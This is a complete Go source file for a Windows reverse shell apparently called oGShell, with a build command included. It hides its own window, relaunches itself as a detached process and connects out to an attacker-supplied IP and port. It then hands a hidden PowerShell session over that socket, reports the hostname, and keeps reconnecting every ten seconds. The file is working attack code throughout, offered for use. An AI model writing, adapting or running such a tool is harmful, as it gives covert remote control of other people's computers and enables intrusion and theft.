//go:build windows

/*
GOOS=windows GOARCH=amd64 go build -o oGShell.exe cmd/windows/main.go
*/
package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

var serverIP = ""
var serverPort = ""

const CREATE_NEW_PROCESS_GROUP = 0x00000200

func relaunchDetached(serverIP, serverPort string) {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command(exe, "-detached", serverIP, serverPort)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: CREATE_NEW_PROCESS_GROUP | 0x00000008,
		HideWindow:    true,
	}
	cmd.Start()
}

func tryConnect(serverIP, serverPort string) bool {
	address := net.JoinHostPort(serverIP, serverPort)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return false
	}

	hostname, _ := os.Hostname()
	conn.Write([]byte("Connected to host: " + hostname + "\n"))

	cmd := exec.Command("powershell.exe", "-NoExit", "-NoLogo")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NEW_PROCESS_GROUP,
	}

	if err := cmd.Start(); err != nil {
		conn.Close()
		return false
	}

	cmd.Wait()
	conn.Close()
	return true
}

func printHelp() {
	fmt.Println("Usage: oGShell.exe <serverIP> <serverPort>")
	fmt.Println("")
	fmt.Println("If you want to hardcode the IP and Port, set the serverIP and serverPort variables before building.")
	os.Exit(1)
}

func timedRead(prompt, defaultVal string, timeout time.Duration) string {
	fmt.Printf("%s ", prompt)

	ch := make(chan string, 1)
	go func() {
		var input string
		fmt.Scanln(&input)
		input = strings.TrimSpace(input)
		ch <- input
	}()

	select {
	case input := <-ch:
		if input == "" {
			return defaultVal
		}
		return input
	case <-time.After(timeout):
		fmt.Println("\nTimed out, using default:", defaultVal)
		return defaultVal
	}
}

func getConnectionDetails(defaultIP, defaultPort string, timeout time.Duration) (string, string) {
	fmt.Printf("Enter IP and Port or wait %.0f seconds to use defaults (%s:%s):\n",
		timeout.Seconds(), defaultIP, defaultPort)
	fmt.Println("Press Enter without typing anything to use defaults.")

	ip := timedRead("IP:", defaultIP, timeout)
	if ip == defaultIP {
		return defaultIP, defaultPort
	}
	port := timedRead("Port:", defaultPort, timeout)
	return ip, port
}

func main() {
	detached := flag.Bool("detached", false, "Running as detached process")
	flag.Parse()

	args := flag.Args()

	switch len(args) {
	case 2:
		serverIP = args[0]
		serverPort = args[1]
		if net.ParseIP(serverIP) == nil {
			fmt.Printf("Invalid IP address: %s\n", serverIP)
			if serverIP != "" && serverPort != "" {
				fmt.Printf("Hardcoded IP and port is %s:%s\n", serverIP, serverPort)
				if strings.ToLower(timedRead("Would you like to continue with this host? (Y/N):", "n", 15*time.Second)) == "n" {
					fmt.Println("Quitting.")
					printHelp()
				}
			}
		} else {
			break
		}
		fallthrough
	case 0:
		serverIP, serverPort = getConnectionDetails(serverIP, serverPort, 30*time.Second)
		fmt.Printf("Attempting to use IP and Port: %s:%s\n", serverIP, serverPort)
		if serverIP == "" && serverPort == "" {
			fmt.Println("IP and Port are null, quitting.")
			printHelp()
		}
	default:
		printHelp()
	}

	if !*detached {
		relaunchDetached(serverIP, serverPort)
		return
	}

	retryDuration := 5 * time.Minute
	retryInterval := 10 * time.Second
	deadline := time.Now().Add(retryDuration)

	for time.Now().Before(deadline) {
		if tryConnect(serverIP, serverPort) {
			deadline = time.Now().Add(retryDuration)
		}
		if time.Now().Before(deadline) {
			time.Sleep(retryInterval)
		}
	}
}
